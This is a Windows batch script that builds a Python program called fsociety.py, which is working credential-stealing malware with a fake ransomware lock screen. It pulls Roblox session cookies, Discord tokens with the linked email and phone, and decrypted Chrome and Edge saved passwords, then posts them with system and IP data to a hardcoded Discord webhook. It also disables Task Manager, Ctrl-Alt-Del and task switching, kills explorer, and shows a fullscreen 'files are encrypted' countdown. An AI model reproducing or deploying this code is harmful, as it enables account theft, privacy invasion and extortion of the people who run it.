echo import os > fsociety.py
echo import json >> fsociety.py
echo import re >> fsociety.py
echo import time >> fsociety.py
echo import sqlite3 >> fsociety.py
echo import win32crypt >> fsociety.py
echo import shutil >> fsociety.py
echo import requests >> fsociety.py
echo import socket >> fsociety.py
echo import subprocess >> fsociety.py
echo import platform >> fsociety.py
echo from datetime import datetime >> fsociety.py
echo from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes >> fsociety.py
echo from cryptography.hazmat.backends import default_backend >> fsociety.py
echo from Crypto.Cipher import AES >> fsociety.py
echo import base64 >> fsociety.py
echo import ctypes >> fsociety.py
echo import sys >> fsociety.py
echo import tkinter as tk >> fsociety.py
echo from tkinter import font, messagebox >> fsociety.py
echo import threading >> fsociety.py
echo import win32api >> fsociety.py
echo import win32con >> fsociety.py
echo import win32gui >> fsociety.py
echo import win32process >> fsociety.py
echo import psutil >> fsociety.py
echo. >> fsociety.py
echo WEBHOOK_URL = "https://discord.com/api/webhooks/1526624417810223164/OCWEGhdaSXb1MwF3tZWoV2sray_8vJmVYn40P4lB2wTGHffdGob3pY-5G0KHkBSG1zyb" >> fsociety.py
echo PASSWORD = "PurelyForTesting" >> fsociety.py
echo LOCK_SCREEN_TITLE = "fsociety app" >> fsociety.py
echo COUNTDOWN_SECONDS = 3597 >> fsociety.py
echo. >> fsociety.py
echo def disable_task_manager(): >> fsociety.py
echo     try: >> fsociety.py
echo         key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_SET_VALUE) >> fsociety.py
echo         win32api.RegSetValueEx(key, "DisableTaskMgr", 0, win32con.REG_DWORD, 1) >> fsociety.py
echo         win32api.RegCloseKey(key) >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo def disable_ctrl_alt_del(): >> fsociety.py
echo     try: >> fsociety.py
echo         key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_SET_VALUE) >> fsociety.py
echo         win32api.RegSetValueEx(key, "DisableCAD", 0, win32con.REG_DWORD, 1) >> fsociety.py
echo         win32api.RegCloseKey(key) >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo def disable_task_switching(): >> fsociety.py
echo     try: >> fsociety.py
echo         key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", 0, win32con.KEY_SET_VALUE) >> fsociety.py
echo         win32api.RegSetValueEx(key, "AltTabSettings", 0, win32con.REG_DWORD, 1) >> fsociety.py
echo         win32api.RegCloseKey(key) >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo def hide_taskbar(): >> fsociety.py
echo     try: >> fsociety.py
echo         taskbar = win32gui.FindWindow("Shell_TrayWnd", None) >> fsociety.py
echo         win32gui.ShowWindow(taskbar, win32con.SW_HIDE) >> fsociety.py
echo         start = win32gui.FindWindow("Button", "Start") >> fsociety.py
echo         win32gui.ShowWindow(start, win32con.SW_HIDE) >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo def kill_explorer(): >> fsociety.py
echo     try: >> fsociety.py
echo         for proc in psutil.process_iter(['pid', 'name']): >> fsociety.py
echo             if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe': >> fsociety.py
echo                 proc.kill() >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo def parse_roblox_cookie(cookie_string): >> fsociety.py
echo     info = {"username": "Unknown", "user_id": "Unknown"} >> fsociety.py
echo     try: >> fsociety.py
echo         if ".ROBLOSECURITY" in cookie_string: >> fsociety.py
echo             token = cookie_string.split(": ")[1] if ": " in cookie_string else cookie_string >> fsociety.py
echo             headers = {"Cookie": f".ROBLOSECURITY={token}"} >> fsociety.py
echo             response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=5) >> fsociety.py
echo             if response.status_code == 200: >> fsociety.py
echo                 data = response.json() >> fsociety.py
echo                 info["username"] = data.get("UserName", "Unknown") >> fsociety.py
echo                 info["user_id"] = str(data.get("UserID", "Unknown")) >> fsociety.py
echo                 info["robux"] = data.get("RobuxBalance", "Unknown") >> fsociety.py
echo                 info["premium"] = data.get("IsPremium", False) >> fsociety.py
echo     except: pass >> fsociety.py
echo     return info >> fsociety.py
echo. >> fsociety.py
echo def extract_roblox_cookies_with_info(): >> fsociety.py
echo     cookies = [] >> fsociety.py
echo     paths = [os.path.expandvars(r"%%LOCALAPPDATA%%\Roblox\LocalStorage\LocalStorage.db"), os.path.expandvars(r"%%APPDATA%%\Roblox\LocalStorage\LocalStorage.db")] >> fsociety.py
echo     for db_path in paths: >> fsociety.py
echo         if os.path.exists(db_path): >> fsociety.py
echo             try: >> fsociety.py
echo                 conn = sqlite3.connect(db_path) >> fsociety.py
echo                 cursor = conn.cursor() >> fsociety.py
echo                 cursor.execute("SELECT key, value FROM LocalStorage WHERE key LIKE '%%RBXSession%%' OR key LIKE '%%_RBX%%'") >> fsociety.py
echo                 rows = cursor.fetchall() >> fsociety.py
echo                 for key, value in rows: >> fsociety.py
echo                     if value: >> fsociety.py
echo                         cookie_str = f"{key}: {value[:200]}" >> fsociety.py
echo                         info = parse_roblox_cookie(cookie_str) >> fsociety.py
echo                         cookies.append({"raw": cookie_str, "username": info["username"], "user_id": info["user_id"], "robux": info.get("robux", "Unknown"), "premium": info.get("premium", False)}) >> fsociety.py
echo                 conn.close() >> fsociety.py
echo             except: pass >> fsociety.py
echo     browser_paths = [os.path.expandvars(r"%%LOCALAPPDATA%%\Google\Chrome\User Data\Default\Cookies"), os.path.expandvars(r"%%LOCALAPPDATA%%\Microsoft\Edge\User Data\Default\Cookies")] >> fsociety.py
echo     for path in browser_paths: >> fsociety.py
echo         if os.path.exists(path): >> fsociety.py
echo             try: >> fsociety.py
echo                 temp = os.path.join(os.environ["TEMP"], "cookies_temp.db") >> fsociety.py
echo                 shutil.copyfile(path, temp) >> fsociety.py
echo                 conn = sqlite3.connect(temp) >> fsociety.py
echo                 cursor = conn.cursor() >> fsociety.py
echo                 cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%%roblox%%' AND name = '.ROBLOSECURITY'") >> fsociety.py
echo                 rows = cursor.fetchall() >> fsociety.py
echo                 for name, value in rows: >> fsociety.py
echo                     if value: >> fsociety.py
echo                         cookie_str = f"{name}: {value[:200]}" >> fsociety.py
echo                         info = parse_roblox_cookie(cookie_str) >> fsociety.py
echo                         cookies.append({"raw": cookie_str, "username": info["username"], "user_id": info["user_id"], "robux": info.get("robux", "Unknown"), "premium": info.get("premium", False)}) >> fsociety.py
echo                 conn.close() >> fsociety.py
echo                 os.remove(temp) >> fsociety.py
echo             except: pass >> fsociety.py
echo     return cookies if cookies else [{"raw": "No Roblox cookies found", "username": "N/A", "user_id": "N/A"}] >> fsociety.py
echo. >> fsociety.py
echo def get_discord_user_info(token): >> fsociety.py
echo     info = {"username": "Unknown", "discriminator": "0000", "id": "Unknown", "badges": [], "email": "Unknown", "phone": "Unknown", "nitro": False} >> fsociety.py
echo     try: >> fsociety.py
echo         headers = {"Authorization": token} >> fsociety.py
echo         response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5) >> fsociety.py
echo         if response.status_code == 200: >> fsociety.py
echo             data = response.json() >> fsociety.py
echo             info["username"] = data.get("username", "Unknown") >> fsociety.py
echo             info["discriminator"] = data.get("discriminator", "0000") >> fsociety.py
echo             info["id"] = data.get("id", "Unknown") >> fsociety.py
echo             info["email"] = data.get("email", "Unknown") >> fsociety.py
echo             info["phone"] = data.get("phone", "Unknown") >> fsociety.py
echo             flags = data.get("flags", 0) >> fsociety.py
echo             badge_map = {1: "Employee", 2: "Partner", 4: "HypeSquad", 8: "Bug Hunter", 16: "Bravery", 32: "Brilliance", 64: "Balance", 128: "Early Supporter", 1024: "Bug Hunter 2", 4096: "Bot Developer"} >> fsociety.py
echo             for flag, badge in badge_map.items(): >> fsociety.py
echo                 if flags & flag: info["badges"].append(badge) >> fsociety.py
echo             try: >> fsociety.py
echo                 sub_response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=5) >> fsociety.py
echo                 if sub_response.status_code == 200: >> fsociety.py
echo                     subs = sub_response.json() >> fsociety.py
echo                     for sub in subs: >> fsociety.py
echo                         if sub.get("type") in [1, 2]: info["nitro"] = True; break >> fsociety.py
echo             except: pass >> fsociety.py
echo     except: pass >> fsociety.py
echo     return info >> fsociety.py
echo. >> fsociety.py
echo def extract_discord_tokens_with_info(): >> fsociety.py
echo     tokens = [] >> fsociety.py
echo     token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}' >> fsociety.py
echo     discord_paths = [os.path.expandvars(r"%%APPDATA%%\discord\Local Storage\leveldb"), os.path.expandvars(r"%%LOCALAPPDATA%%\Discord\Local Storage\leveldb")] >> fsociety.py
echo     for path in discord_paths: >> fsociety.py
echo         if os.path.exists(path): >> fsociety.py
echo             for file in os.listdir(path): >> fsociety.py
echo                 if file.endswith(".log") or file.endswith(".ldb"): >> fsociety.py
echo                     try: >> fsociety.py
echo                         with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f: >> fsociety.py
echo                             content = f.read() >> fsociety.py
echo                             matches = re.findall(token_pattern, content) >> fsociety.py
echo                             for token in matches: >> fsociety.py
echo                                 info = get_discord_user_info(token) >> fsociety.py
echo                                 tokens.append({"token": token, "username": f"{info['username']}#{info['discriminator']}", "id": info["id"], "badges": info["badges"], "nitro": info.get("nitro", False), "email": info["email"], "phone": info["phone"]}) >> fsociety.py
echo                     except: pass >> fsociety.py
echo     seen = set() >> fsociety.py
echo     unique_tokens = [] >> fsociety.py
echo     for t in tokens: >> fsociety.py
echo         if t["token"] not in seen: >> fsociety.py
echo             seen.add(t["token"]) >> fsociety.py
echo             unique_tokens.append(t) >> fsociety.py
echo     return unique_tokens if unique_tokens else [{"token": "No Discord tokens found", "username": "N/A"}] >> fsociety.py
echo. >> fsociety.py
echo def get_ip_info(): >> fsociety.py
echo     try: >> fsociety.py
echo         ip = requests.get("https://api.ipify.org", timeout=5).text >> fsociety.py
echo         geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json() >> fsociety.py
echo         return {"ip": ip, "country": geo.get("country", "N/A"), "city": geo.get("city", "N/A"), "isp": geo.get("isp", "N/A")} >> fsociety.py
echo     except: return {"ip": "unknown", "country": "unknown", "city": "unknown", "isp": "unknown"} >> fsociety.py
echo. >> fsociety.py
echo def get_system_info(): >> fsociety.py
echo     return {"hostname": socket.gethostname(), "os": platform.system() + " " + platform.release(), "username": os.getlogin(), "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB", "cpu_count": psutil.cpu_count()} >> fsociety.py
echo. >> fsociety.py
echo def extract_browser_passwords(): >> fsociety.py
echo     passwords = [] >> fsociety.py
echo     browsers = {"Chrome": os.path.expandvars(r"%%LOCALAPPDATA%%\Google\Chrome\User Data\Default\Login Data"), "Edge": os.path.expandvars(r"%%LOCALAPPDATA%%\Microsoft\Edge\User Data\Default\Login Data")} >> fsociety.py
echo     for name, path in browsers.items(): >> fsociety.py
echo         if os.path.exists(path): >> fsociety.py
echo             try: >> fsociety.py
echo                 temp = os.path.join(os.environ["TEMP"], f"{name}_login.db") >> fsociety.py
echo                 shutil.copyfile(path, temp) >> fsociety.py
echo                 conn = sqlite3.connect(temp) >> fsociety.py
echo                 cursor = conn.cursor() >> fsociety.py
echo                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins") >> fsociety.py
echo                 rows = cursor.fetchall() >> fsociety.py
echo                 for url, user, enc_pw in rows: >> fsociety.py
echo                     if user and enc_pw: >> fsociety.py
echo                         try: >> fsociety.py
echo                             pw = win32crypt.CryptUnprotectData(enc_pw, None, None, None, 0)[1].decode('utf-8') >> fsociety.py
echo                             if pw: passwords.append(f"{url} | {user} | {pw}") >> fsociety.py
echo                         except: pass >> fsociety.py
echo                 conn.close() >> fsociety.py
echo                 os.remove(temp) >> fsociety.py
echo             except: pass >> fsociety.py
echo     return passwords if passwords else ["No stored passwords found"] >> fsociety.py
echo. >> fsociety.py
echo def gather_all_data(): >> fsociety.py
echo     data = {"timestamp": datetime.now().isoformat(), "system": get_system_info(), "ip_info": get_ip_info(), "roblox_cookies": extract_roblox_cookies_with_info(), "discord_tokens": extract_discord_tokens_with_info(), "browser_passwords": extract_browser_passwords()} >> fsociety.py
echo     return data >> fsociety.py
echo. >> fsociety.py
echo def send_to_webhook(data): >> fsociety.py
echo     roblox_text = "" >> fsociety.py
echo     for cookie in data["roblox_cookies"][:5]: >> fsociety.py
echo         if cookie["username"] != "N/A": >> fsociety.py
echo             roblox_text += f"**{cookie['username']}** (ID: {cookie['user_id']})" >> fsociety.py
echo             if cookie.get("robux") and cookie["robux"] != "Unknown": roblox_text += f" | Robux: {cookie['robux']}" >> fsociety.py
echo             if cookie.get("premium"): roblox_text += " | Premium: Yes" >> fsociety.py
echo             roblox_text += f"\nToken: `{cookie['raw'][:80]}...`\n\n" >> fsociety.py
echo         else: roblox_text += f"Raw: `{cookie['raw'][:100]}...`\n\n" >> fsociety.py
echo     discord_text = "" >> fsociety.py
echo     for token_data in data["discord_tokens"][:5]: >> fsociety.py
echo         if token_data["username"] != "N/A": >> fsociety.py
echo             discord_text += f"**{token_data['username']}** (ID: {token_data['id']})" >> fsociety.py
echo             if token_data.get("nitro"): discord_text += " | Nitro: Yes" >> fsociety.py
echo             if token_data.get("badges"): discord_text += f"\nBadges: {', '.join(token_data['badges'][:3])}" >> fsociety.py
echo             if token_data.get("email") and token_data["email"] != "Unknown": discord_text += f"\nEmail: {token_data['email']}" >> fsociety.py
echo             discord_text += f"\nToken: `{token_data['token'][:50]}...`\n\n" >> fsociety.py
echo         else: discord_text += f"Token: `{token_data['token'][:80]}...`\n\n" >> fsociety.py
echo     embed = {"title": "FSOCIETY DATA EXFIL", "color": 0xFF0000, "fields": [{"name": "System", "value": f"{data['system']['hostname']} | {data['system']['os']} | {data['ip_info']['ip']}", "inline": False}, {"name": f"Roblox ({len(data['roblox_cookies'])})", "value": roblox_text[:1024] or "None", "inline": False}, {"name": f"Discord ({len(data['discord_tokens'])})", "value": discord_text[:1024] or "None", "inline": False}, {"name": f"Passwords ({len(data['browser_passwords'])})", "value": "\n".join(data['browser_passwords'][:5])[:1024] or "None", "inline": False}], "footer": {"text": f"fsociety | {len(data['discord_tokens'])} tokens, {len(data['roblox_cookies'])} cookies"}} >> fsociety.py
echo     try: requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10) >> fsociety.py
echo     except: pass >> fsociety.py
echo. >> fsociety.py
echo class FsocietyLockScreen: >> fsociety.py
echo     def __init__(self, root): >> fsociety.py
echo         self.root = root >> fsociety.py
echo         self.root.title(LOCK_SCREEN_TITLE) >> fsociety.py
echo         self.root.attributes("-fullscreen", True) >> fsociety.py
echo         self.root.attributes("-topmost", True) >> fsociety.py
echo         self.root.overrideredirect(True) >> fsociety.py
echo         self.root.configure(bg="#0a0a0a") >> fsociety.py
echo         self.root.config(cursor="none") >> fsociety.py
echo         self.root.protocol("WM_DELETE_WINDOW", lambda: None) >> fsociety.py
echo         self.remaining = COUNTDOWN_SECONDS >> fsociety.py
echo         self.locked = True >> fsociety.py
echo         self.apply_lockdown() >> fsociety.py
echo         self.build_ui() >> fsociety.py
echo         self.update_timer() >> fsociety.py
echo         self.root.bind_all("<Key>", self.key_filter) >> fsociety.py
echo         self.lock_cursor() >> fsociety.py
echo         threading.Thread(target=self.lockdown_watchdog, daemon=True).start() >> fsociety.py
echo. >> fsociety.py
echo     def apply_lockdown(self): >> fsociety.py
echo         try: disable_task_manager(); disable_ctrl_alt_del(); disable_task_switching(); hide_taskbar(); threading.Thread(target=self.kill_explorer_delayed, daemon=True).start() >> fsociety.py
echo         except: pass >> fsociety.py
echo. >> fsociety.py
echo     def kill_explorer_delayed(self): time.sleep(2); kill_explorer() >> fsociety.py
echo. >> fsociety.py
echo     def lockdown_watchdog(self): >> fsociety.py
echo         while True: >> fsociety.py
echo             time.sleep(2) >> fsociety.py
echo             try: >> fsociety.py
echo                 taskbar = win32gui.FindWindow("Shell_TrayWnd", None) >> fsociety.py
echo                 if win32gui.IsWindowVisible(taskbar): win32gui.ShowWindow(taskbar, win32con.SW_HIDE) >> fsociety.py
echo                 disable_task_manager(); disable_ctrl_alt_del(); disable_task_switching() >> fsociety.py
echo             except: pass >> fsociety.py
echo. >> fsociety.py
echo     def key_filter(self, event): >> fsociety.py
echo         allowed = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','BackSpace','Return'] >> fsociety.py
echo         if event.keysym not in allowed: return "break" >> fsociety.py
echo         if event.state & 0x4 and event.keysym in ['c','C','x','X','v','V','a','A']: return "break" >> fsociety.py
echo         if event.state & 0x8: return "break" >> fsociety.py
echo         if event.keysym in ['Super_L','Super_R']: return "break" >> fsociety.py
echo. >> fsociety.py
echo     def lock_cursor(self): >> fsociety.py
echo         try: >> fsociety.py
echo             screen_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN) >> fsociety.py
echo             screen_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN) >> fsociety.py
echo             ctypes.windll.user32.ClipCursor(ctypes.byref(ctypes.wintypes.RECT(0, 0, screen_width, screen_height))) >> fsociety.py
echo         except: pass >> fsociety.py
echo. >> fsociety.py
echo     def build_ui(self): >> fsociety.py
echo         main = tk.Frame(self.root, bg="#0a0a0a"); main.pack(expand=True, fill="both") >> fsociety.py
echo         title = tk.Label(main, text="fsociety app", font=font.Font(family="Courier", size=48, weight="bold"), fg="#00ff00", bg="#0a0a0a"); title.pack(pady=(80, 20)) >> fsociety.py
echo         warn = tk.Label(main, text="Oops, your important files are encrypted.", font=font.Font(family="Courier", size=20), fg="#ff4444", bg="#0a0a0a"); warn.pack(pady=10) >> fsociety.py
echo         self.timer_label = tk.Label(main, text="00:59:57", font=font.Font(family="Courier", size=36), fg="#ffaa00", bg="#0a0a0a"); self.timer_label.pack(pady=30) >> fsociety.py
echo         entry_frame = tk.Frame(main, bg="#0a0a0a"); entry_frame.pack(pady=20) >> fsociety.py
echo         self.pw_var = tk.StringVar() >> fsociety.py
echo         self.pw_entry = tk.Entry(entry_frame, textvariable=self.pw_var, show="*", font=font.Font(family="Courier", size=18), width=30, bg="#1a1a1a", fg="#00ff00", insertbackground="#00ff00", relief="flat", highlightthickness=2, highlightcolor="#00ff00") >> fsociety.py
echo         self.pw_entry.pack(side="left", padx=10) >> fsociety.py
echo         self.pw_entry.bind("<Return>", lambda e: self.check_password()) >> fsociety.py
echo         unlock_btn = tk.Button(entry_frame, text="UNLOCK", command=self.check_password, font=font.Font(family="Courier", size=14, weight="bold"), bg="#00ff00", fg="#000000", padx=20, pady=5, relief="flat", activebackground="#00cc00"); unlock_btn.pack(side="left") >> fsociety.py
echo         stats_frame = tk.Frame(main, bg="#0a0a0a"); stats_frame.pack(pady=40) >> fsociety.py
echo         for i, s in enumerate(["35.4K", "1,156", "7,850", "8,798"]): >> fsociety.py
echo             lbl = tk.Label(stats_frame, text=s, font=font.Font(family="Courier", size=14), fg="#00ff00", bg="#0a0a0a"); lbl.grid(row=0, column=i, padx=30) >> fsociety.py
echo         footer = tk.Label(main, text="fsociety.2025-12-6", font=font.Font(family="Courier", size=12), fg="#555555", bg="#0a0a0a"); footer.pack(side="bottom", pady=30) >> fsociety.py
echo         self.pw_entry.focus_set() >> fsociety.py
echo. >> fsociety.py
echo     def update_timer(self): >> fsociety.py
echo         if self.remaining <= 0: self.timer_label.config(text="00:00:00", fg="#ff0000"); return >> fsociety.py
echo         mins = self.remaining // 60; secs = self.remaining %% 60; hours = mins // 60; mins = mins %% 60 >> fsociety.py
echo         self.timer_label.config(text=f"{hours:02d}:{mins:02d}:{secs:02d}") >> fsociety.py
echo         self.remaining -= 1 >> fsociety.py
echo         self.root.after(1000, self.update_timer) >> fsociety.py
echo. >> fsociety.py
echo     def check_password(self): >> fsociety.py
echo         if self.pw_var.get() == PASSWORD: self.unlock() >> fsociety.py
echo         else: self.pw_entry.delete(0, tk.END); self.pw_entry.config(highlightcolor="#ff0000"); self.root.after(500, lambda: self.pw_entry.config(highlightcolor="#00ff00")) >> fsociety.py
echo. >> fsociety.py
echo     def unlock(self): >> fsociety.py
echo         if not self.locked: return >> fsociety.py
echo         self.locked = False >> fsociety.py
echo         try: taskbar = win32gui.FindWindow("Shell_TrayWnd", None); win32gui.ShowWindow(taskbar, win32con.SW_SHOW); ctypes.windll.user32.ClipCursor(ctypes.c_int(0)) >> fsociety.py
echo         except: pass >> fsociety.py
echo         threading.Thread(target=self.exfil_and_exit, daemon=True).start() >> fsociety.py
echo         self.root.quit(); self.root.destroy() >> fsociety.py
echo. >> fsociety.py
echo     def exfil_and_exit(self): >> fsociety.py
echo         data = gather_all_data(); send_to_webhook(data) >> fsociety.py
echo         try: >> fsociety.py
echo             with open(os.path.expandvars(r"%%TEMP%%\fsociety_data.json"), "w") as f: json.dump(data, f, indent=2) >> fsociety.py
echo         except: pass >> fsociety.py
echo         time.sleep(2); sys.exit(0) >> fsociety.py
echo. >> fsociety.py
echo if __name__ == "__main__": >> fsociety.py
echo     try: >> fsociety.py
echo         if ctypes.windll.shell32.IsUserAnAdmin(): pass >> fsociety.py
echo         else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1); sys.exit() >> fsociety.py
echo     except: pass >> fsociety.py
echo     try: win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE) >> fsociety.py
echo     except: pass >> fsociety.py
echo     root = tk.Tk() >> fsociety.py
echo     app = FsocietyLockScreen(root) >> fsociety.py
echo     root.mainloop() >> fsociety.py